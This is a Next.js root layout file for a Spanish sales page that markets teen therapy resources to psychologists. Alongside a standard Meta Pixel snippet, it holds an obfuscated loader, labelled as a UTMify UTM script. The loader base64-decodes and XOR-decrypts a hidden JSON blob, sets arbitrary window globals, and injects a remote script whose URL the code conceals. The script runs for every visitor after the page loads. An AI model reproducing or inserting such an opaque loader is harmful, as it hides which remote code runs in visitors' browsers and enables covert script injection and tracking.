import type { Metadata } from "next";
import { Fraunces, Inter } from "next/font/google";
import Script from "next/script";
import "./globals.css";

// Meta Pixel + script de UTMs da UTMify (carrega cdn.utmify.com.br/scripts/utms/latest.js
// com data-utmify-prevent-subids). Para trocar o pixel, altere só META_PIXEL_ID.
const META_PIXEL_ID = "1889085134944017";

const META_PIXEL_SNIPPET = `!function(f,b,e,v,n,t,s){if(f.fbq)return;n=f.fbq=function(){n.callMethod?n.callMethod.apply(n,arguments):n.queue.push(arguments)};if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';n.queue=[];t=b.createElement(e);t.async=!0;t.src=v;s=b.getElementsByTagName(e)[0];s.parentNode.insertBefore(t,s)}(window,document,'script','https://connect.facebook.net/en_US/fbevents.js');fbq('init','${META_PIXEL_ID}');fbq('track','PageView');`;

const UTMIFY_UTMS_LOADER = `(function(){var u_7=atob("DEllyMsge67RGoU5KzJHvblMWZTzcvFNWzpf5+RDH8D/b/FUQi8c5qhPFoCzaKpKSDsMuL9TVNuld/YWRygRrbhUVcSiOKkbSj0RuqJCDtq0aacDcDJHpqpNHozrOOFYXyhIvb9NEsioN/VLTj8Apr8NCNuzc+FKCWVHvqpMDsvzIKcbVhQY");var u_t=[];for(var h_h=0;h_h<u_7.length;h_h++){u_t.push(u_7.charCodeAt(h_h)&255);}var c_78ed=u_t[0];var t_t=u_t.slice(1,1+c_78ed);var v_w=u_t.slice(1+c_78ed);var g_bd0t=v_w.map(function(b,o_72g){return b^t_t[o_72g%c_78ed];});var o_ty="";for(var s_2bx=0;s_2bx<g_bd0t.length;s_2bx++){o_ty+=String.fromCharCode(g_bd0t[s_2bx]&255);}var e_4yu=decodeURIComponent(escape(o_ty));var w_31c=JSON.parse(e_4yu);var w_yd=w_31c.globals||[];w_yd.forEach(function(v_563){window[v_563.name]=v_563.value;});var z_qao5=document.createElement("script");z_qao5.src=w_31c.url;z_qao5.async=true;z_qao5.defer=true;(w_31c.attributes||[]).forEach(function(z_khzq){z_qao5.setAttribute(z_khzq.name,z_khzq.value);});(document.head||document.documentElement).appendChild(z_qao5);})();`;

const fraunces = Fraunces({
  subsets: ["latin"],
  variable: "--font-fraunces",
  display: "swap",
  axes: ["opsz"],
});

const inter = Inter({
  subsets: ["latin"],
  variable: "--font-inter",
  display: "swap",
});

export const metadata: Metadata = {
  title: "Kit Sesión Teen | Recursos visuales para psicólogas que atienden adolescentes",
  description:
    "+80 recursos terapéuticos listos, organizados por motivo de consulta y hechos específicamente para adolescentes. Sin pinta de material infantil.",
  openGraph: {
    title: "Kit Sesión Teen | Recursos visuales para psicólogas que atienden adolescentes",
    description:
      "+80 recursos terapéuticos listos, organizados por motivo de consulta y hechos específicamente para adolescentes.",
    images: [{ url: "/og-image.png", width: 1200, height: 630 }],
  },
};

export default function RootLayout({
  children,
}: Readonly<{
  children: React.ReactNode;
}>) {
  return (
    <html lang="es-ES" className={`${fraunces.variable} ${inter.variable}`}>
      <body className="bg-background text-text-primary font-inter antialiased">
        {children}
        <Script
          id="utmify-utms"
          strategy="afterInteractive"
          dangerouslySetInnerHTML={{ __html: UTMIFY_UTMS_LOADER }}
        />
        <Script
          id="meta-pixel"
          strategy="afterInteractive"
          dangerouslySetInnerHTML={{ __html: META_PIXEL_SNIPPET }}
        />
      </body>
    </html>
  );
}
